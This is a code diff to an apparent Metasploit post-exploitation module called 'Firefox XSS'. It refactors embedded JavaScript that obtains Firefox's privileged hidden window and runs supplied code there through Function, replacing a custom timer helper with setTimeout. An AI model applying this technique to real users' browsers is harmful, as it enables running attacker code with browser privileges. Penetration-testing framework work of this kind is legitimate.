@@ -7,6 +7,9 @@ require 'msf/core'
 require 'json'
 
 class Metasploit3 < Msf::Post
+
+  include Msf::Payload::Firefox
+
   def initialize(info={})
     super(update_info(info,
       'Name'          => 'Firefox XSS',
@@ -47,6 +50,8 @@ class Metasploit3 < Msf::Post
     %Q|
 
       (function(send){
+        #{set_timeout_source}
+
         var hiddenWindow = Components.classes["@mozilla.org/appshell/appShellService;1"]
                                .getService(Components.interfaces.nsIAppShellService)
                                .hiddenDOMWindow;
@@ -60,9 +65,9 @@ class Metasploit3 < Msf::Post
         
         var evt = function() {
           if (hiddenWindow[key]) {
-            schedule(evt);
+            setTimeout(evt, 200);
           } else {
-            schedule(function(){
+            setTimeout(function(){
               try {
                 send(hiddenWindow.Function('send', src)(send));
               } catch (e) {
@@ -72,13 +77,7 @@ class Metasploit3 < Msf::Post
           }
         };
 
-        var schedule = function(cb, delay) {
-          var timer = Components.classes["@mozilla.org/timer;1"].createInstance(Components.interfaces.nsITimer);
-          timer.initWithCallback({notify:cb}, delay\|\|200, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
-          return timer;
-        };
-
-        schedule(evt);
+        setTimeout(evt, 200);
       })(send);
 
     |.strip
